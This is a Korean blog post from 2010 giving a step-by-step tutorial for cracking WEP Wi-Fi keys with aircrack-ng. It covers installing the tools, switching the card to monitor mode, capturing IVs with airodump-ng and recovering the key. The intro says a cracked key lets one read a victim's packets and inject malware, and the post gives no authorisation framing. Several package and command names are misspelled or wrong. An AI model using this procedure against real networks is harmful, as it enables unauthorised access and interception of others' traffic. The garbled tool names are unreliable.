---
layout: post
title: WEB 무선랙 크랙하기"
subtitle: "aricrack"
date: 2010-09-10 10:57:00+0900
categories: Linux
tags: Linux Utility Aricrack
mathjax: true
---

무선랜의 암호화 방식중 WEP의 암호키를 알아내는 방법입니다.
WEP의 크랙에 성공하게 되면 해당 사용자가 보내는 모든 패킷을 볼 수 있고, 이를 가로 채서 악성코드를 심을수도 있습니다.

필요한 툴들을 설치하기위한 저장소를 수정하겠습니다.  
```
%sudo cp /etc/apt/sources.list /etc/apt/sources.list_back
```
기존의 저장소를 백업해둡니다.  

```
#sudo gedit /etc/apt/sources.list
```
저장소를 열어 아래의 내용을 추가합니다.(카이스트 저장소 추가)  
> deb http://kr.archive.ubuntu.com/ubuntu/ maverick-security multiverse  
deb-src http://kr.archive.ubuntu.com/ubuntu/ maverick-security multiverse  

```
#sudo apt-get update
```

저장소를 업데이트한후 재부팅해줍니다.


필요한 툴들을 설치합니다.
```
%sudo apt-get install aricrack-ng
%sudo apt-get install airmon-ng
%sudo apt-get install airodump-ng
%sudo apt-get install aircrack-ng
%sudo apt-get install kismet
```

먼저 iwcofing 명령어를 통해 현재 설치되어있는 네트워크 인터페이스의 정보를 확인합니다.
![img](/resource/20100910/20100910-img-1.png)  

현재 제 컴퓨터에 사용하고 있는 무선랜 인터페이스의 이름은 wlan0입니다.  
이 무선랜 인터페이스를 모니터 모드로 바꿔주어야 합니다.  
```
$sudo airmon-ng start [인터페이스 이름]
```

![img](/resource/20100910/20100910-img-2.png)  

성공적으로 이루어지면 mon0이라는 모니터 모드로 동작하고 있는 새로운 인터페이스가 추가되어있습니다.  
![img](/resource/20100910/20100910-img-3.png)  

그럼 이제 airodump-ng으로 실시간으로 지나가는 모든 패킷을 캡처링을 할 수 있습니다.  

```
%sudo airodump-ng mon0 -w dump
```

으로 lv데이터를 모아서 dump 파일로 만듭니다.  
lv데이터는 AP와 수신할때 앞에 24비트의 정보를 포함하고 있는 데이터를 말합니다.  
![img](/resource/20100910/20100910-img-4.png)  

충분히 많은  IVs를 모았을때
```
$sudo aircrack-ng dump-01.cap
```  
를 이용하여 암호를 알아냅니다.

![img](/resource/20100910/20100910-img-5.png)  

[참고]http://www.askstudent.com/hacking/how-to-crack-a-wep-key-using-ubuntu/